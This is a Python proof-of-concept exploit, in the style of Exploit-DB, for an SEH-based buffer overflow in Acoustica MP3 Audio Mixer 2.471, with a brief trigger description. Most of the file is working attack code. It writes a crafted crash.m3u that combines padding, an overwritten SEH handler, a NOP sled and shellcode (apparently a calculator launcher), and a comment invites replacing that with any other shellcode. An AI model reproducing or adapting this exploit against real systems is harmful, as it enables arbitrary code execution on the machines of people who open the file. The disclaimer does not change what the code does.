# Exploit Title: Acoustica MP3 Audio Mixer 2.471 Extended M3U directives SEH
# Date: September 8 2010
# Author: Carlos Hollmann 
# Software Link: http://www.acoustica.com/downloading.asp?p=1
# Version: 2.471
# Tested on: Windows xp sp3 running on VMware Fusion 3.1 and VirtualBox 3.2.8
# CVE : 


#    ________  _    _________   ____ __ _____   ________
#   / ____/ / | |  / / ____/ | / / //_//  _/ | / / ____/
#  / __/ / /  | | / / __/ /  |/ / ,<   / //  |/ / / __  
# / /___/ /___| |/ / /___/ /|  / /| |_/ // /|  / /_/ /  
#/_____/_____/|___/_____/_/ |_/_/ |_/___/_/ |_/\____/   

# COLOMBIA presents.............
#        PoC from  D3V!L FucK3r http://www.exploit-db.com/exploits/9213/
#
#	Carlos Mario Penagos Hollmann A.K.A Elvenking  shogilord@gmail.com
#	Extended M3U directives

# 	Background from http://hanna.pyxidis.org/tech/m3u.html


 
#	The software doesn't  handle correctly M3U's header and extra info when is being imported on a open sound group.
# 	Trigger: launch app, open an existing sound group i.e(C:\Program Files\Acoustica MP3 Audio Mixer\example.sgp) then import the crash.m3u and....KaaaaBooom!!
#
#     
#     Greetings: My Family, Algeria-->sud0 Australia--> tecr0c,Peru-->fataku,Spain-->Alberto Hervalejo, OFFSEC TEAM and all my friends in Colombia 
#	!!! PAZ PARA MI PAIS PAZ PARA COLOMBIA !!! Freedom!!
	



# Script provided 'as is', without any warranty.
# Use for educational purposes only.
# Do not use this code to do anything illegal !
# I do not want anyone to use this script
# for malicious and/or illegal purposes
# I cannot be held responsible for any illegal use.
 
# Note : you are not allowed to edit/modify this code. 
# If you do, I will not be held responsible for any damages this may cause.

#!/usr/bin/python


magic 	= "crash.m3u"


vuln 	= "\x23\x0D\x0A\x23\x0D\x0A" # Extended M3U, no EXTM3U, no EXTINFO , can change OD for any  value \x1b,\x0a.........


junk 		=	"\x41" * 816
ds_eax 		=	"\x25\x25\x47\x7E" #First Call ds:[eax+8], Writeable memory address to put in EAX
morejunk 	=	"\x42" * 8308
nSEH 		=	"\xEB\x06\x90\x90" #short jmp 6 bytes 
SEH 		=	"\x3F\x28\xD1\x72"#SEH Handler
nops 		=	"\x90" * 10 #landing padd
shellcode	=	"\x8b\xec\x55\x8b\xec\x68\x20\x20\x20\x2f\x68\x63\x61\x6c\x63\x8d\x45\xf8\x50\xb8\xc7\x93\xc2\x77\xff\xd0" # Thanks  sud0, any other shell works too  just remove "\x00\x0a"
payload	=	vuln+junk+ds_eax+morejunk+nSEH+SEH+nops+shellcode

file = open(magic , 'w')
file.write(payload)
file.close()

